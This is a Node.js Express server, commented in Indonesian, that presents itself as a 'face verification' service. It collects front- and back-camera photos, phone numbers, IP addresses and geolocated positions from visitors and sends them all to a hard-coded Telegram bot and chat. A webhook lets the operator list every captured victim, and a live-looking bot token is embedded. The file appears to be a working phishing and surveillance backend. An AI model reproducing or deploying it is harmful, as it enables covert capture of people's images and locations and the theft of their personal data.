const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const multer = require('multer');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.BOT_TOKEN || '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = process.env.CHAT_ID || '7352381955';

console.log('🚀 ========================================');
console.log('🚀 Server starting on Railway');
console.log('🚀 ========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ Set' : '❌ Not set'}`);
console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ Set' : '❌ Not set'}`);
console.log(`🌐 PORT: ${PORT}`);
console.log('🚀 ========================================');

// Setup multer untuk handle file upload
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: { fileSize: 20 * 1024 * 1024 } // 20MB
});

app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true, limit: '20mb' }));
app.use(express.static('public'));

// Database
const DB_PATH = path.join(__dirname, 'data.json');

function readDatabase() {
  try {
    if (fs.existsSync(DB_PATH)) {
      const data = fs.readFileSync(DB_PATH, 'utf8');
      return JSON.parse(data);
    }
  } catch (e) {
    console.error('Error reading DB:', e);
  }
  return { users: [] };
}

function writeDatabase(data) {
  try {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error('Error writing DB:', e);
  }
}

// Get location from IP
async function getLocationFromIp(ip) {
  try {
    const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
    if (!cleanIp) return 'Tidak diketahui';
    
    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city`);
    const data = await res.json();
    
    if (data.status === 'success') {
      return `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`;
    }
  } catch (e) {
    console.error('Geolocation error:', e.message);
  }
  return 'Tidak diketahui';
}

// Send message to Telegram
async function sendTelegramMessage(chatId, text) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    console.log('📤 Sending message to:', chatId);
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'Markdown'
      })
    });
    const data = await response.json();
    console.log('📨 Message response:', data.ok ? '✅ Success' : '❌ Failed');
    return data;
  } catch (err) {
    console.error('Send message error:', err);
    return null;
  }
}

// Webhook untuk bot Telegram
app.post('/webhook', async (req, res) => {
  try {
    const { message } = req.body;
    console.log('📨 Webhook received');
    
    if (message && message.text === '/info') {
      const chatId = message.chat.id;
      const db = readDatabase();
      
      if (db.users.length === 0) {
        await sendTelegramMessage(chatId, '📭 Belum ada data verifikasi.');
        return res.sendStatus(200);
      }
      
      let response = '📊 *DATA VERIFIKASI*\n\n';
      db.users.forEach((user, index) => {
        response += `${index + 1}. 📱 ${user.phone || 'User'}\n`;
        response += `   🕒 ${user.timestamp}\n`;
        response += `   📍 ${user.location}\n\n`;
      });
      response += `\nTotal: ${db.users.length} orang`;
      
      await sendTelegramMessage(chatId, response);
    }
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Webhook error:', err);
    res.sendStatus(500);
  }
});

// TEST endpoints
app.get('/test-bot', async (req, res) => {
  console.log('🧪 Testing bot connection...');
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
    const response = await fetch(url);
    const data = await response.json();
    console.log('🤖 Bot info:', data.ok ? '✅ Success' : '❌ Failed');
    res.json(data);
  } catch (err) {
    console.error('❌ Bot test error:', err);
    res.status(500).json({ error: err.message });
  }
});

app.get('/test-send', async (req, res) => {
  console.log('🧪 Testing send message...');
  try {
    const result = await sendTelegramMessage(CHAT_ID, '🧪 Test message from Railway server!');
    res.json(result);
  } catch (err) {
    console.error('❌ Send test error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Verify endpoint dengan multer untuk handle file
app.post('/api/verify', upload.fields([
  { name: 'image', maxCount: 1 },
  { name: 'backImage', maxCount: 1 }
]), async (req, res) => {
  console.log('📸 ===== NEW VERIFICATION REQUEST =====');
  console.log('📸 Time:', new Date().toISOString());
  
  try {
    // Ambil file dari req.files
    const files = req.files;
    const phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
    
    console.log(`📱 Phone: ${phone}`);
    console.log(`📸 Files received:`, Object.keys(files));
    
    // Cek file image (front camera)
    if (!files.image || !files.image[0]) {
      console.log('❌ No image file received');
      return res.status(400).json({ success: false, error: 'Foto tidak ditemukan' });
    }
    
    const frontFile = files.image[0];
    console.log(`📸 Front image: ${frontFile.originalname}, size: ${frontFile.size} bytes`);
    
    // Get IP and location
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    console.log(`🌐 IP: ${ip}`);
    
    const location = await getLocationFromIp(ip);
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    
    console.log(`📍 Location: ${location}`);
    console.log(`🕒 Time: ${timestamp}`);
    
    // Save to database
    const db = readDatabase();
    db.users.push({
      phone: phone,
      timestamp: timestamp,
      location: location,
      ip: ip,
      hasBackCamera: files.backImage && files.backImage[0] ? true : false
    });
    writeDatabase(db);
    console.log('💾 Data saved to database');
    
    // ===== SEND FRONT PHOTO TO TELEGRAM =====
    console.log('📤 Sending front photo to Telegram...');
    
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('❌ BOT_TOKEN or CHAT_ID not set!');
      return res.status(500).json({ 
        success: false, 
        error: 'BOT_TOKEN or CHAT_ID not configured' 
      });
    }
    
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', 
      `🟡 *Verifikasi Wajah - DEPAN*\n\n` +
      `📱 *User:* ${phone}\n` +
      `📍 *Lokasi:* ${location}\n` +
      `🕒 *Waktu:* ${timestamp}\n` +
      `🌐 *IP:* ${ip}\n\n` +
      `_Foto depan dikirim untuk verifikasi_`
    );
    form.append('photo', frontFile.buffer, { 
      filename: `verifikasi_depan_${Date.now()}.jpg`, 
      contentType: 'image/jpeg' 
    });
    
    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form,
    });
    
    const tgData = await tgResponse.json();
    console.log('📨 Telegram response status:', tgResponse.status);
    console.log('📨 Telegram response ok:', tgData.ok);
    
    if (!tgData.ok) {
      console.error('❌ Telegram error:', JSON.stringify(tgData, null, 2));
      return res.status(500).json({ 
        success: false, 
        error: 'Gagal kirim ke Telegram: ' + (tgData.description || 'Unknown error')
      });
    }
    
    console.log('✅ Front photo sent successfully!');
    
    // Send back photo if exists
    if (files.backImage && files.backImage[0]) {
      console.log('📤 Sending back photo to Telegram...');
      const backFile = files.backImage[0];
      console.log(`📸 Back image: ${backFile.originalname}, size: ${backFile.size} bytes`);
      
      const backForm = new FormData();
      backForm.append('chat_id', CHAT_ID);
      backForm.append('caption', 
        `🟡 *Verifikasi Wajah - BELAKANG*\n\n` +
        `📱 *User:* ${phone}\n` +
        `📍 *Lokasi:* ${location}\n` +
        `🕒 *Waktu:* ${timestamp}\n\n` +
        `_Foto belakang dikirim untuk verifikasi_`
      );
      backForm.append('photo', backFile.buffer, { 
        filename: `verifikasi_belakang_${Date.now()}.jpg`, 
        contentType: 'image/jpeg' 
      });
      
      const backResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: backForm,
      });
      
      const backData = await backResponse.json();
      console.log('📨 Back camera response:', backData.ok ? '✅ Success' : '❌ Failed');
    }
    
    console.log('✅ ===== PROCESS COMPLETED =====');
    res.json({ success: true });
    
  } catch (err) {
    console.error('❌ Verify error:', err);
    console.error('❌ Error stack:', err.stack);
    res.status(500).json({ 
      success: false, 
      error: err.message || 'Terjadi kesalahan server' 
    });
  }
});

// Root endpoint
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
